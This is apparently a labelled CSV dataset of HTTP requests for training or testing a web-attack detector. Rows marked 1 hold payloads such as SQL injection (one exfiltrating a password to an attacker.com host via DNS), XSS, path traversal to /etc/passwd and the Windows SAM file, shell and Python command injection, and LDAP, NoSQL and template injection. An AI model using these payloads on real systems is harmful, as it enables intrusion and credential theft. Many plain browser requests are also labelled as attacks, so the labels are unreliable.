method,path,query,headers,body,ua,label
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: api.internal
Accept: */*",,,1
,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: www.mysite.com
Accept: */*",,,0
GET,/,,,,,0
GET,/,,,,,0
GET,select from,,,,,1
GET,/,,,,,0
GET,/,,,,,0
GET,"id=1 AND (SELECT LOAD_FILE(CONCAT('\\', (SELECT password FROM users LIMIT 0,1), '.attacker.com\a')))",,,,,1
GET,/admin/users,limit=20&offset=40,,,,0
POST,/newsletter/subscribe,,,,,0
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: www.mysite.com
Accept: */*",,,1
GET,/,,,,,0
GET,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: www.mysite.com
Accept: */*",,,1
GET,/,,,,,0
GET,/,<svg/onload=alert(1)>,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: example.com
Accept: */*",,,1
GET,id=1' OR '1'='1,,,,,1
POST,/,,,"{""$gt"": """"}",,1
GET,/,,,,,0
GET,"<a href=""http://malicious.com"" target=""_blank"">Click here</a>",,,,,1
,/robots.txt,,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: www.mysite.com
Accept: */*",,,0
POST,/,,,"{""name"": ""__import__('os').system('id')""}",,1
GET,/,,,,,0
GET,/,,,,,0
GET,/,,,,,0
GET,/,,,,,0
GET,%0d%0aBcc: victim@example.com,,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: example.com
Accept: */*",,,1
POST,/,,,{{7*7}}{{ '7'*7 }},,1
GET,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: app.local
Accept: */*",,,1
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: www.mysite.com
Accept: */*",,,1
GET,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: www.mysite.com
Accept: */*",,,1
GET,/,,"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1
Host: api.internal
Accept: */*",,,1
GET,/,id=0x27204f52202731273d2731,,,,1
GET,/help/kb/search,query=how+to+reset+password,,,,0
GET,/,,,,,0
GET,"<noscript><p title=""</noscript><img src=x onerror=alert(1)>"">",,,,,1
GET,/,,,,,0
GET,/,__proto__[admin]=true,,,,1
GET,<script>alert('XSS')</script>,,,,,1
,/,,,,,0
,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: app.local
Accept: */*",,,0
GET,select from,,,,,1
GET,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: www.mysite.com
Accept: */*",,,1
GET,query { a: user(id:1) { name } b: user(id:2) { name } },,,,,1
GET,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: api.internal
Accept: */*",,,1
GET,/,,,,,0
GET,/,,,,,0
GET,/,,,,,0
GET,/,,,,,0
,/favicon.ico,,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: example.com
Accept: */*",,,0
GET,/,,,,,0
,/api/health,,,,,0
,/robots.txt,,,,,0
GET,union select,,,,,1
GET,/,,,,,0
GET,/,__proto__[admin]=true,,,,1
GET,/,,,,,0
GET,../../../../etc/passwd,,,,,1
GET,/,,,,,0
GET,/,,,,,0
GET,/,,,,,0
GET,..\..\..\..\windows\system32\config\sam,,,,,1
GET,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: api.internal
Accept: */*",,,1
GET,/,,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: www.mysite.com
Accept: */*",,,1
GET,/,,,,,0
GET,/,,,,,0
GET,/,,,,,0
GET,select from,,,,,1
GET,/,(&(uid=admin)(|(password=*))),,,,1
GET,/,(&(uid=admin)(|(password=*))),,,,1
GET,"<iframe src=""https://target.com"" style=""opacity:0.5""></iframe>",,,,,1
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: example.com
Accept: */*",,,1
,/api/health,,,,,0
GET,/,,"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1
Host: example.com
Accept: */*",,,1
GET,User-Agent: ' OR SLEEP(5) OR ',,,,,1
GET,/,,,,,0
GET,/,id=0x27204f52202731273d2731,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: example.com
Accept: */*",,,1
GET,/,,,,,0
GET,/,,,,,0
GET,/,,,,,0
GET,../../../../etc/passwd,,,,,1
GET,/admin/users,limit=20&offset=40,,,,0
GET,/,,,,,0
GET,/,id=0x27204f52202731273d2731,,,,1
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: www.mysite.com
Accept: */*",,,1
GET,/,php://filter/convert.base64-encode/resource=index.php,,,,1
POST,/,,,"{""$gt"": """"}",,1
GET,/,,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: api.internal
Accept: */*",,,1
GET,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: example.com
Accept: */*",,,1
GET,cat /etc/passwd,,,,,1
,/robots.txt,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: app.local
Accept: */*",,,0
GET,/,,,,,0
GET,/,,,,,0
,/robots.txt,,,,,0
GET,/,,,,,0
,/robots.txt,,,,,0
GET,/,,,,,0
GET,/,,,,,0
GET,cat /etc/passwd,,,,,1
POST,/logs/client,,,"{""error"": ""Uncaught TypeError"", ""stack"": ""...""}",,0
GET,/,,,,,0
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: example.com
Accept: */*",,,1
GET,../../../../etc/passwd,,,,,1
GET,/products,category=electronics&brand=apple,,,,0
GET,/,,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: api.internal
Accept: */*",,,1
GET,/,,,,,0
GET,/,,"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1
Host: app.local
Accept: */*",,,1
GET,/,,"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1
Host: api.internal
Accept: */*",,,1
GET,/,,,,,0
GET,/,,,,,0
GET,../../../../etc/passwd,,,,,1
GET,/,,,,,0
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: www.mysite.com
Accept: */*",,,1
GET,/,,,,,0
GET,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: example.com
Accept: */*",,,1
GET,/,,,,,0
GET,/,id=1'/**/OR/**/'1'='1,,,,1
POST,/,,,"{""$gt"": """"}",,1
GET,/,,,,,0
GET,/,,,,,0
GET,/,(&(uid=admin)(|(password=*))),,,,1
GET,%0d%0a* CAPABILITY,,,,,1
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: example.com
Accept: */*",,,1
,/api/health,,,,,0
POST,/login,,,Content-Type: application/x-www-form-urlencoded user=john&pass=doe,,0
GET,/,class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7B,,,,1
GET,/,,,,,0
GET,|| ls -la,,,,,1
,/favicon.ico,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: app.local
Accept: */*",,,0
POST,/user/password-update,,,"{""old"": ""pass1"", ""new"": ""pass2""}",,0
GET,/,,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: example.com
Accept: */*",,,1
GET,/,,,,,0
GET,/,,,,,0
GET,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: www.mysite.com
Accept: */*",,,1
GET,"<video><source onerror=""alert(1)"">",,,,,1
,/favicon.ico,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: app.local
Accept: */*",,,0
GET,/,,,,,0
GET,/,,,,,0
GET,id=1'; WAITFOR DELAY '0:0:5'--,,,,,1
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: api.internal
Accept: */*",,,1
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: api.internal
Accept: */*",,,1
GET,/,onerror=alert(1),,,,1
GET,|| ls -la,,,,,1
